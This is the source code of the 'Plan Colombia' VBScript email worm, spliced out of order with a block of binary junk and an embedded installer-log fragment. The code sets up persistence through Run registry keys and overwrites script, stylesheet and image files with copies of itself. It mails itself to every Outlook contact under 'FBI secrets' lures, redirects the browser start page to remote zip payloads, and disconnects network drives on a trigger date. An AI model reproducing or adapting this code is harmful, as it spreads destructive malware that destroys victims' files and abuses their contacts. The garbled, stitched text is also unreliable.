  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                            {?Â¢Á   ñ˜9>XXÉ<n®{¿Â¢A   ñ˜9¾XXÉ¼n®{? ‘vA   ñ˜9>XXÉ<n®{¿ ‘vÁ    ›*¿Œİ>?    ]D    ›*?Œİ>¿    ]Ä   ñ˜9¾XXÉ¼n®{?°X@A   ñ˜9>XXÉ<n®{¿°X@Á    ›*¿Œİ>?    ôe‘D    ›*?Œİ>¿    ôe‘Ä   ñ˜9¾XXÉ¼n®{?pLÀ   ñ˜9>XXÉ<n®{¿pL@     €?         0(Å      €¿         0(E    ‡9¾¬ó=–{?­Â•Â   ‡9>¬ó½–{¿­Â•B   ‡9¾¬ó=–{?hÂ   ‡9>¬ó½–{¿hB    ›*?Œİ>¿    `yÄ    ›*¿Œİ>?    `yD     €?         ğÅ      €¿         ğE    ‡9¾¬ó=–{?-Ï)Â   ‡9>¬ó½–{¿-Ï)B    ›*?Œİ>¿    œuÄ    ›*¿Œİ>?    œuD     T A R G E T D I R = " C : \ P r o g r a m \ F T P   E x p l o r e r \ "   C U R R E N T D I R E C T O R Y = " C : \ W I N D O W S \ T E M P \ W Z S E 0 . T M P "   C L I E N T U I L E V E L = " 0 "   C L I E N T P R O C E S S I D = " - 1 3 7 3 6 1 7 "   U S E R N A M E = " J a c o b "   C O M P A N Y N A M E = " m a l m b o r g "   S O U R C E D I R = " C : \ W I N D O W S \ T E M P \ W Z S E 0 . T M P \ "   A C T I O N = " I N S T A L L "   E X E C U T E A C T I O N = " I N S T A L L "   I N S T A L L L E V E L = " 1 "   R O O T D R I V E = " C : \ "   S E C O N D S E Q U E N C E = " 1 "    ›*¿Œİ>?    ÔRœD    ›*?Œİ>¿    ÔRœÄ   #^=Ú^f¾™y?lëÃ   #^½Ú^f>™y¿lëC   #^=Ú^f¾™y?Õ‹ÙÃ   #^½Ú^f>™y¿Õ‹ÙC    ›*¿Œİ>?    bFD    ›*?Œİ>¿    bFÄ   #^=Ú^f¾™y?ÊÛÃ   #^½Ú^f>™y¿ÊÛC    ›*¿Œİ>?    CO D    ›*?Œİ>¿    CO Ä   #^=Ú^f¾™y?GMâÃ   #^½Ú^f>™y¿GMâC   *Â‡¼8á¾"}?ç«Ã   *Â‡<8á>"}¿ç«C   *Â‡¼8á¾"}?ºô™Ã   *Â‡<8á>"}¿ºô™C    ›*?Œİ>¿    ÎašÄ    ›*¿Œİ>?    ÎašD   *Â‡¼8á¾"}?É›Ã   *Â‡<8á>"}¿É›C    ›*?Œİ>¿    ìX˜Ä    ›*¿Œİ>?    ìX˜D   *Â‡¼8á¾"}?íÚ¢Ã   *Â‡<8á>"}¿íÚ¢C       %¶f¾øjy?"‰¢Ã       %¶f>øjy¿"‰¢C       %¶f¾øjy?©Ã       %¶f>øjy¿©C       %¶f¾øjy?“(’Ã       %¶f>øjy¿“(’C       %¶f¾øjy?Ûm™Ã       %¶f>øjy¿Ûm™C    ›*¿Œİ>?    Í£D    ›*?Œİ>¿    Í£Ä   *Â‡<8á>"}?vCÄ   *Â‡¼8á¾"}¿vCD   *Â‡<8á>"}?[r:Ä   *Â‡¼8á¾"}¿[r:D    ›*¿Œİ>?    éŠD    ›*?Œİ>¿    éŠÄ   *Â‡<8á>"}?\;Ä   *Â‡¼8á¾"}¿\;D    ›*¿Œİ>?    ¬œD    ›*?Œİ>¿    ¬œÄ   *Â‡<8á>"}?tå>Ä   *Â‡¼8á¾"}¿tå>D   #^½Ú^f>™y?Ş0Ä   #^=Ú^f¾™y¿Ş0D   #^½Ú^f>™y?ã'Ä   #^=Ú^f¾™y¿ã'D    ›*?Œİ>¿    ÁÁÄ    ›*¿Œİ>?    ÁÁD   #^½Ú^f>™y?Ÿ(Ä   #^=Ú^f¾™y¿Ÿ(D    ›*?Œİ>¿    ş¯	Ä    ›*¿Œİ>?    ş¯	D   #^½Ú^f>™y?ÁC,Ä   #^=Ú^f¾™y¿ÁC,D    ›*¿Œİ>?    kv/D    ›*?Œİ>¿    kv/Ä    ›*¿Œİ>?    ‡]3D    ›*?Œİ>¿    ‡]3Ä    ›*¿Œİ>?    Jo7D    ›*?Œİ>¿    Jo7Ä   ñ˜9>XXÉ<n®{?´ƒÄ   ñ˜9¾XXÉ¼n®{¿´ƒD   ñ˜9>XXÉ<n®{?j~Ä   ñ˜9¾XXÉ¼n®{¿j~D    ›*?Œİ>¿    _”+Ä    ›*¿Œİ>?    _”+D     €?          'Å      €¿          'E    ñ˜9>XXÉ<n®{?~CÄ   ñ˜9¾XXÉ¼n®{¿~CD    ›*?Œİ>¿    ›‚'Ä    ›*¿Œİ>?    ›‚'D     €?          &Å      €¿          &E    ñ˜9>XXÉ<n®{?—kÄ   ñ˜9¾XXÉ¼n®{¿—kD    ›*¿Œİ>?    IMD    ›*?Œİ>¿    IMÄ   ‡9>¬ó½–{?¢ÓpÄ   ‡9¾¬ó=–{¿¢ÓpD   ‡9>¬ó½–{?’ØgÄ   ‡9¾¬ó=–{¿’ØgD    ›*¿Œİ>?    %0QD    ›*?Œİ>¿    %0QÄ   ‡9>¬ó½–{?¯hÄ   ‡9¾¬ó=–{¿¯hD    ›*¿Œİ>?    èAUD    ›*?Œİ>¿    èAUÄ   ‡9>¬ó½–{?µDlÄ   ‡9¾¬ó=–{¿µDlD    ›*?Œİ>¿    ıfIÄ    ›*¿Œİ>?    ıfID    ›*?Œİ>¿    9UEÄ    ›*¿Œİ>?    9UED   Afd½àjÌ<˜…?:<ÔÃ   Afd=àjÌ¼˜…¿:<ÔC   Afd½àjÌ<˜…?£AÂÃ   Afd=àjÌ¼˜…¿£AÂC   Afd½àjÌ<˜…?‹9ÄÃ   Afd=àjÌ¼˜…¿‹9ÄC   Afd½àjÌ<˜…?V=ËÃ   Afd=àjÌ¼˜…¿V=ËC   ó5¿ó5?    KúD   ó5?ó5¿    KúÄ   5ÏJ=û>ƒ}?Â£PÄ   5ÏJ½û¾ƒ}¿Â£PD   5ÏJ=û>ƒ}?GÄ   5ÏJ½û¾ƒ}¿GD   ó5¿ó5?    '!D   ó5?ó5¿    '!Ä   5ÏJ=û>ƒ}?¼‡HÄ   5ÏJ½û¾ƒ}¿¼‡HD   ó5¿ó5?    Ãî$D   ó5?ó5¿    Ãî$Ä   5ÏJ=û>ƒ}?ÕLÄ   5ÏJ½û¾ƒ}¿ÕLD   ~HÊ<¢>Ú|?ÔJÄ   ~HÊ¼¢¾Ú|¿ÔJD   ~HÊ<¢>Ú|?ïšAÄ   ~HÊ¼¢¾Ú|¿ïšAD   ó5?ó5¿    néÄ   ó5¿ó5?    néD   ~HÊ<¢>Ú|?„BÄ   ~HÊ¼¢¾Ú|¿„BD   ó5?ó5¿    ÓÄ   ó5¿ó5?    ÓD   ~HÊ<¢>Ú|?ÆFÄ   ~HÊ¼¢¾Ú|¿ÆFD   ¬Ì<¬Ì<×?} Ä   ¬Ì¼¬Ì¼×¿} D   ¬Ì<¬Ì<×?ºşÄ   ¬Ì¼¬Ì¼×¿ºşD   ó5?ó5?    ••'Å   ó5¿ó5¿    ••'E   ¬Ì<¬Ì<×?‘şÄ   ¬Ì¼¬Ì¼×¿‘şD   ó5?ó5?    ®œ&Å   ó5¿ó5¿    ®œ&E   ¬Ì<¬Ì<×?~Ä   ¬Ì¼¬Ì¼×¿~D    ›*¿Œİ>?    qÍC    ›*?Œİ>¿    qÍÃ    ›*¿Œİ>?    Æ?ÕC    ›*?Œİrem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas8 2 7 7 5 9 5 1 0 ==============================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP."
 Else
  If numero = 2 Then
    polye = ".JPG"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GC : \ W I N D O W S \ T E M P \ 1 3 b d 9 f . m s i n fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrl